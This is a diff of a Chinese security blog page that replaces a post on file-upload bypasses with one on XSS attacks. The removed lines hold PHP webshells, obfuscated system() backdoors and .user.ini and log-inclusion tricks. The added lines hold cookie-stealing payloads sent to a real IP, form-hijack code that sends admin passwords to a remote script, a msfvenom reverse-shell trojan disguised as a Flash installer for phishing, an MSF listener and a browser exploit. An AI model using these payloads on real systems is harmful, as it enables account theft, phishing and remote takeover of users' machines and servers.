@@ -4,11 +4,10 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="文件上传绕过, 白芨的小屋">
-    <meta name="description" content="文件上传漏洞-限制绕过1、前端javascript验证一般只校验后缀名，利用f12可修改前端js代码绕过。
-2、MIME文件类型检测修改content-type为允许上传类型进行绕过。
-常见MIME类型
-超文本标记语言文本 .html,.h">
+    <meta name="keywords" content="XSS漏洞, 白芨的小屋">
+    <meta name="description" content="xss跨站脚本攻击1、XSS漏洞原理：攻击者向有XSS 漏洞的网站中（web页面）插入恶意的JavaScript代码，当用户浏览该网站页面时，嵌入其中的代码就会自动执行，从而达到恶意攻击的用户目的。
+常见产生于有数据交互、数据输出的地方
+2">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -20,7 +19,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>文件上传绕过 | 白芨的小屋</title>
+    <title>XSS漏洞 | 白芨的小屋</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -312,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/banner/upload.jpeg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/banner/xss.jpeg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">文件上传绕过</h1>
+                    <h1 class="description center-align post-title">XSS漏洞</h1>
                 </div>
             </div>
         </div>
@@ -437,8 +436,8 @@
                                 <span class="chip bg-color">web安全</span>
                             </a>
                         
-                            <a href="/tags/%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/">
-                                <span class="chip bg-color">文件类型漏洞</span>
+                            <a href="/tags/%E9%92%93%E9%B1%BC/">
+                                <span class="chip bg-color">钓鱼</span>
                             </a>
                         
                     </div>
@@ -462,7 +461,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-02-22
+                    2022-04-07
                 </div>
                 
 
@@ -471,7 +470,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.7k
+                    2.2k
                 </div>
                 
 
@@ -491,157 +490,173 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="文件上传漏洞-限制绕过"><a href="#文件上传漏洞-限制绕过" class="headerlink" title="文件上传漏洞-限制绕过"></a>文件上传漏洞-限制绕过</h1><h2 id="1、前端javascript验证"><a href="#1、前端javascript验证" class="headerlink" title="1、前端javascript验证"></a>1、前端javascript验证</h2><p>一般只校验后缀名，利用f12可修改前端js代码绕过。</p>
-<h2 id="2、MIME文件类型检测"><a href="#2、MIME文件类型检测" class="headerlink" title="2、MIME文件类型检测"></a>2、MIME文件类型检测</h2><p>修改<strong>content-type</strong>为允许上传类型进行绕过。</p>
-<p>常见MIME类型</p>
-<pre class="line-numbers language-none"><code class="language-none">超文本标记语言文本 .html,.html -&gt;   text&#x2F;html
+                <h1 id="xss跨站脚本攻击"><a href="#xss跨站脚本攻击" class="headerlink" title="xss跨站脚本攻击"></a>xss跨站脚本攻击</h1><h2 id="1、XSS漏洞原理："><a href="#1、XSS漏洞原理：" class="headerlink" title="1、XSS漏洞原理："></a><strong>1、XSS漏洞原理：</strong></h2><p>攻击者向有XSS 漏洞的网站中（web页面）插入恶意的<code>JavaScript</code>代码，当用户浏览该网站页面时，嵌入其中的代码就会自动执行，从而达到恶意攻击的用户目的。</p>
+<p><strong>常见产生于有数据交互、数据输出的地方</strong></p>
+<h2 id="2、XSS漏洞的分类"><a href="#2、XSS漏洞的分类" class="headerlink" title="2、XSS漏洞的分类"></a>2、XSS漏洞的分类</h2><h3 id="2-1、反射型-XSS-非持久型"><a href="#2-1、反射型-XSS-非持久型" class="headerlink" title="2.1、反射型 XSS (非持久型)"></a>2.1、反射型 XSS (非持久型)</h3><p>（1）黑客<strong>诱使用户“点击”</strong>带有XSS代码的恶意链接。</p>
+<p>（2）用户点击该恶意链接后向目标服务器发送请求、服务器处理后把带有 <strong><code>XSS </code>代码</strong>的数据返回到用户浏览器。</p>
+<p>（3）浏览器<strong>解析</strong>这段带有 XSS 代码的数据后，向<strong>恶意服务器</strong>发送请求</p>
+<p>（4）黑客从自己搭建的服务器获得用户提交的信息。</p>
+<h3 id="2-2、存储型-XSS-持久型-XSS"><a href="#2-2、存储型-XSS-持久型-XSS" class="headerlink" title="2.2、存储型 XSS (持久型 XSS)"></a>2.2、存储型 XSS (持久型 XSS)</h3><p>​    存储型XSS漏洞是因为服务器端将用户输入的恶意脚本没有通过任何验证就直接“存储”在数据库，并且每次通过调用数据库的方式，将该恶意脚本在没有<strong>被编码或转义</strong>的情况下将数据<strong>呈现</strong>在浏览器上</p>
+<p>（1）黑客在目标服务器上构造<code>XSS</code>恶意脚本存储在<strong>数据库</strong>中。</p>
+<p>（2）用户不知情情况下访问目标服务器，查看了恶意代码所在页面、网站将<code>xss</code>同正常页面返回到用户浏览器。</p>
+<p>（3）浏览器<strong>解析</strong>这段带有 XSS 代码的数据后，向<strong>恶意服务器</strong>发送请求</p>
+<p>（4）黑客从自己搭建的服务器获得用户提交的信息。</p>
+<h3 id="2-3、基于-DOM-的-XSS"><a href="#2-3、基于-DOM-的-XSS" class="headerlink" title="2.3、基于 DOM 的 XSS"></a>2.3、基于 DOM 的 XSS</h3><p>​    <strong>接收数据过程由<code>JavaScript</code>代码实现</strong>。从效果来看，DOM 式XSS 其实是一种<strong>特殊类型的反射型 XSS</strong>。通过修改页面的DOM节点形成的XSS（网页本身的 JavaScript也是可以改变 HTML）。相比前两种XSS漏洞，这里<strong>不需要</strong>使用服务器进行解析。</p>
+<p>（1）黑客<strong>诱使用户“点击”</strong>带有XSS代码的恶意链接。</p>
+<p>（2）用户点击该恶意链接后浏览器端<strong>DOM</strong>解析并触发恶意代码，向<strong>恶意服务器</strong>发送请求</p>
+<p>（3）黑客从自己搭建的服务器获得用户提交的信息。</p>
+<h3 id="2-4、其他XSS"><a href="#2-4、其他XSS" class="headerlink" title="2.4、其他XSS"></a>2.4、其他XSS</h3><h4 id="2-4-1、UXSS（通用型xss）"><a href="#2-4-1、UXSS（通用型xss）" class="headerlink" title="2.4.1、UXSS（通用型xss）"></a>2.4.1、UXSS（通用型xss）</h4><p><strong>UXSS（Universal Cross-Site Scripting）</strong>是利用<strong>浏览器</strong>或者<strong>浏览器扩展漏洞</strong>来制造产生<code>XSS</code>并执行代码的一种攻击类型。</p>
+<ul>
+<li>MICROSOFT EDGE uXSS <strong>CVE-2021-34506</strong></li>
+<li><strong>Edge浏览器</strong>翻译功能导致<code>JS</code>语句被调用执行</li>
+</ul>
+<p>挖掘技巧：测试浏览器各种功能：如翻译功能。</p>
+<h4 id="2-4-2、Flash-Xss"><a href="#2-4-2、Flash-Xss" class="headerlink" title="2.4.2、Flash Xss"></a>2.4.2、Flash Xss</h4><p><strong>Flash有可以调用js的函数</strong>，也就是可以和js通信，因此这些函数如果使用不当就会造成xss。常见的可触发xss的危险函数有：<code>getURL</code>，<code>navigateToURL</code>，<code>ExternalInterface.call</code>，<code>htmlText</code>，<code>loadMovie</code>等等</p>
+<p><strong>swf引用js的xss</strong></p>
+<p>白盒：<strong>JPEXS Free Flash Decompiler</strong>反编译<code>swf</code>文件，搜索危险函数</p>
+<p>黑盒：下载<code>swf</code>文件，反编译，搜索危险函数</p>
+<h4 id="2-4-3、Pdf-Xss"><a href="#2-4-3、Pdf-Xss" class="headerlink" title="2.4.3、Pdf Xss"></a>2.4.3、Pdf Xss</h4><p><strong>PDFXSS-上传后直链触发</strong></p>
+<p>（1）创建PDF，加入动作JS</p>
+<pre class="line-numbers language-none"><code class="language-none">PDF编辑器 ---&gt; 缩略图 ---&gt; 属性 ---&gt; 动作 ---&gt; 添加动作 ---&gt; 运行JavaScript ---&gt; 添加app.alert(1)；<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-JPEG图形 .jpeg,.jpg -&gt;   image&#x2F;jpeg
+<p>（2）通过文件上<strong>传获取直链</strong></p>
+<p>（3）<strong>直链地址访问</strong>后被触发</p>
+<h2 id="3、XSS利用"><a href="#3、XSS利用" class="headerlink" title="3、XSS利用"></a>3、XSS利用</h2><h3 id="3-1、XSS-后台植入（Cookie-amp-表单）劫持"><a href="#3-1、XSS-后台植入（Cookie-amp-表单）劫持" class="headerlink" title="3.1、XSS-后台植入（Cookie&amp;表单）劫持"></a>3.1、XSS-后台植入（Cookie&amp;表单）劫持</h3><p><strong>条件：已取得相关web权限</strong></p>
+<p>（1）写入<strong>Javascript</strong>代码到<strong>登录成功文件</strong>，利用beef或xss平台实时监控<strong>Cookie</strong>等凭据实现<strong>权限维持</strong></p>
+<p>（2）若存在同源策略或防护情况下，Cookie获取失败可采用<strong>表单劫持</strong>或<strong>数据明文传输</strong>实现</p>
+<p><strong>表单劫持：找到验证密码代码端</strong></p>
+<pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;!--html中：将账号发送到某个地方，某个地方get.php实现接收--&gt;
+&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;www.xxx.com&#x2F;get.php?user-帐号&amp;pass&#x3D;密码&quot;&gt;&lt;&#x2F;script&gt;
+             
+             
+&lt;!-- php中：--&gt;          
+$up&#x3D;&#39;&lt;script src&#x3D;http:&#x2F;&#x2F;xxx&#x2F;get.php?user&#x3D;&#39;.$metinfo_admin_name.&#39;&amp;pass&#x3D;&#39;.$metinfo_admin_pass.&#39;&gt;&lt;&#x2F;script&gt;&#39;;
+echo $up;
+某个地方get.php实现接受
 
-普通文本 .txt -&gt;   text&#x2F;plain
+&lt;!-- get.php：--&gt;
+&lt;?php
+$u&#x3D;$_GET[&#39;user&#39;];
+$p&#x3D;$_GET[&#39;pass&#39;];
+$myfile &#x3D; fopen(&quot;newfile.txt&quot;, &quot;w+&quot;);
+fwrite($myfile,$u);
+fwrite($myfile,&#39;|&#39;);
+fwrite($myfile,$p);
+fwrite($myfile,&#39;\n&#39;);
+fclose($myfile);
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-GIF图形 .gif -&gt;   image&#x2F;gif
+<h3 id="3-2、XSS-Flash钓鱼配合MSF捆绑上线"><a href="#3-2、XSS-Flash钓鱼配合MSF捆绑上线" class="headerlink" title="3.2、XSS-Flash钓鱼配合MSF捆绑上线"></a>3.2、XSS-Flash钓鱼配合MSF捆绑上线</h3><p><strong>条件：beef上线受控后或直接钓鱼</strong></p>
+<p><strong>（1）MSF 生成后门</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;xx.xx.xx.xx LPORT&#x3D;6666 -f exe &gt; flash.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-PNG图形 .png -&gt;   image&#x2F;png<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>（2）下载官方文件-保证安装正常</strong></p>
+<p><strong>（3）压缩捆绑文件-解压提取运行</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">压缩文件时可设置解压前运行后门文件，解压后运行正常文件；并设置解压路径<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h2 id="3、-user-ini（php特性）"><a href="#3、-user-ini（php特性）" class="headerlink" title="3、.user.ini（php特性）"></a>3、.user.ini（php特性）</h2><p><strong>php.ini</strong>：php全局配置文件，对整个web服务起作用；而**.user.ini<strong>和</strong>.htaccess<strong>一样是目录的配置文件，</strong>.user.ini<strong>就是</strong>用户自定义的一个php.ini**，我们可以利用这个文件来构造后门和隐藏后门。</p>
-<p>利用方式：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php">//.user.ini
-auto_prepend_file=test.png						 //包含在文件头
-auto_append_file = test.png            //包含在文件尾（当文件调用的有exit()时该设置无效）
-// test.png：
-<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>
+<p><strong>（4）将文件放到个人服务器可被下载的路径-提前准备好钓鱼页面</strong></p>
+<p><strong>（5）MSF配置监听状态</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handler
+
+set payload windows&#x2F;meterpreter&#x2F;reverse_tcp
+
+set lhost 0.0.0.0
+
+set lport 6666
+
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>（6）诱使受害者访问URL，可利用beef上线跳转URL</strong>。</p>
+<h3 id="3-3、XSS-浏览器网马配合MSF访问上线"><a href="#3-3、XSS-浏览器网马配合MSF访问上线" class="headerlink" title="3.3、XSS-浏览器网马配合MSF访问上线"></a>3.3、XSS-浏览器网马配合MSF访问上线</h3><p><strong>条件：beef上线受控后或直接钓鱼（浏览器存在0day）</strong></p>
+<p><strong>（1）配置MSF生成URL—-利用ms14_064，现多已不适用，可作了解</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;browser&#x2F;ms14_064_ole_code_execution
+
+set allowpowershellprompt true
+
+set target 1
+
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>（2）诱使受害者访问URL，可利用beef上线跳转到网马地址</strong>。</p>
+<h2 id="4、XSS漏洞绕过"><a href="#4、XSS漏洞绕过" class="headerlink" title="4、XSS漏洞绕过"></a>4、XSS漏洞绕过</h2><ul>
+<li><code>document.cookie</code>        //获取<code>cookie</code></li>
+</ul>
+<p><strong>（1）反射型-远程调用</strong></p>
+<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'http://xx.xx.xx.xx/get.php?c='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">// 个人服务器准备接收文件`get.php`接收cookie
+//get.php：
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$cookie</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'C'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cookie.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span><span class="token variable">$cookie</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>（2）反射型-过滤标签<code>&lt;script&gt;、&lt;img&gt;...</code></strong></p>
+<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!--更换标签:JavaScript事件--></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>‘xss’<span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span> 							<span class="token comment">&lt;!--页面加载完毕后立即发生--></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token special-attr"><span class="token attr-name">onclick</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>'xss’<span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>						<span class="token comment">&lt;!--元素被点击时发生--></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>‘xss’<span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span> 				<span class="token comment">&lt;!--数据加载期间发生错误时执行--></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token special-attr"><span class="token attr-name">onmouseenter</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span> 			<span class="token comment">&lt;!--事件在鼠标指针移动到元素上时触发--></span>
  
-#补充: .user.ini两条语句有一条即可，类似于文件包含。其中文件会被当作脚本语言进行执行。
-# .user.ini 实时生效<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token comment">&lt;!--补充：弹框类型:--></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>							<span class="token comment">&lt;!--alert()（警告消息框）--></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"单机“确认”继续，单击“取消”停止"</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>		<span class="token comment">&lt;!--confirm()**（确认消息框）--></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">prompt</span><span class="token punctuation">(</span><span class="token string">"您的名字？"</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>		<span class="token comment">&lt;!--prompt()**（提示消息框）--></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>利用前提：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 服务器脚本语言为PHP</span>
-<span class="token comment"># 服务器使用CGI／FastCGI模式 </span>
-<span class="token comment"># 上传目录下要有可执行的php文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><strong>（3）反射型-过滤空格</strong></p>
+<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!--斜杠代替空格--></span>
+&lt;svg/onload="window.location.href='http://47.94.236.117/get.php?c='+document.cookie;"><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<h2 id="4、文件内容进行了过滤"><a href="#4、文件内容进行了过滤" class="headerlink" title="4、文件内容进行了过滤"></a>4、文件内容进行了过滤</h2><p><strong>利用php短标签绕过</strong></p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span> <span class="token keyword">echo</span> <span class="token string single-quoted-string">'123'</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>  													#前提是开启配置参数short_open_tags=on
-<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token punctuation">(</span>表达式<span class="token punctuation">)</span><span class="token delimiter important">?></span></span>  等价于 <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token punctuation">(</span>表达式<span class="token punctuation">)</span><span class="token delimiter important">?></span></span> 		#不需要开启参数设置
-&lt;% echo '123';%>   									#开启配置参数asp_tags=on，并且只能在7.0以下版本使用
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">echo <span class="token string">'123'</span><span class="token punctuation">;</span> </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> #不需要修改参数开关，但是只能在7.0以下可用
-
-#根据过滤内容更换表达式
-#例：
-<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">&#123;</span>x<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>
-<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'xxx'</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span>							#利用system命令执行
-<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token punctuation">(</span><span class="token string backtick-quoted-string">`nl ../f*`</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span>								#利用反引号``命令执行
-<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>						#利用&#123;&#125;代替[]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><strong>利用日志包含绕过, 图片内容</strong></p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php">#包含默认日志，日志记录UA头，UA头写后门代码  
-.user.ini：auto_prepend_file=test.png
-test.png：<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">include</span><span class="token string double-quoted-string">"/var/lo"</span><span class="token operator">.</span><span class="token string double-quoted-string">"g/nginx/access.lo"</span><span class="token operator">.</span><span class="token string double-quoted-string">"g"</span><span class="token delimiter important">?></span></span> #因为log被过滤了。所以用拼接绕过
-#抓包，在UA头中写入木马<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><strong>校验文件头是否为图片格式文件</strong></p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"># gif文件头 ->   GIF89A
-.user.ini：GIF89A auto_prepend_file=test.png
-test.png：GIF89A <span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">include</span><span class="token string double-quoted-string">"/var/lo"</span><span class="token operator">.</span><span class="token string double-quoted-string">"g/nginx/access.lo"</span><span class="token operator">.</span><span class="token string double-quoted-string">"g"</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p><strong>利用远程包含IP转换地址后门调用执行突破<code>.</code>的过滤</strong></p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php">.user.ini auto_prepend_file=png
-png <span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">include</span><span class="token string single-quoted-string">'http://2016886???/'</span><span class="token operator">></span>
-
-<span class="token comment">#服务器中写入后门文件、利用远程包含访问服务器ip、因 ‘.’ 被过滤，需将ip转化为int形式进行包含</span>
-<span class="token comment">#转换地址：https://www.bejson.com/convert/ip2int/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><strong>直接利用.user.ini远程包含突破上传删除</strong></p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php">auto_prepend_file<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//2016886???/</span>
-
-<span class="token comment">#当.user.ini可以正常上传，被包含文件上传后被删除时，可利用.user.ini直接包含远程后门进行突破上传</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="5、利用-htaccess绕过"><a href="#5、利用-htaccess绕过" class="headerlink" title="5、利用.htaccess绕过"></a>5、利用.htaccess绕过</h2><ul>
-<li>.htaccess默认不支持nginx，设置后支持</li>
-<li>.htaccess可以通过设置实现文件解析配置将.png后缀的文件解析成php</li>
-</ul>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">#首先上传.htaccess</span>
-AddType application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php <span class="token operator">.</span>png   	<span class="token comment">#将.png后缀的文件解析 成php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<h2 id="6、免杀绕过（文件上传）"><a href="#6、免杀绕过（文件上传）" class="headerlink" title="6、免杀绕过（文件上传）"></a>6、免杀绕过（文件上传）</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
-<span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'syste'</span><span class="token punctuation">;</span>
-<span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">;</span>
-<span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">;</span>
-<span class="token variable">$c</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac ../flagaa.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"s#y#s#t#e#m"</span><span class="token punctuation">;</span>
-<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"#"</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token variable">$c</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="7、上传-日志包含绕过"><a href="#7、上传-日志包含绕过" class="headerlink" title="7、上传-日志包含绕过"></a>7、上传-日志包含绕过</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"># 访问地址，UA头写入后门：<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>
-# 上传.user.ini包含日志：auto_prepend_file=/var/log/nginx/access.log
-# 构造.user.ini利用条件：上传index.php 内容随意
-# 蚁剑连接 index.php就可以了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
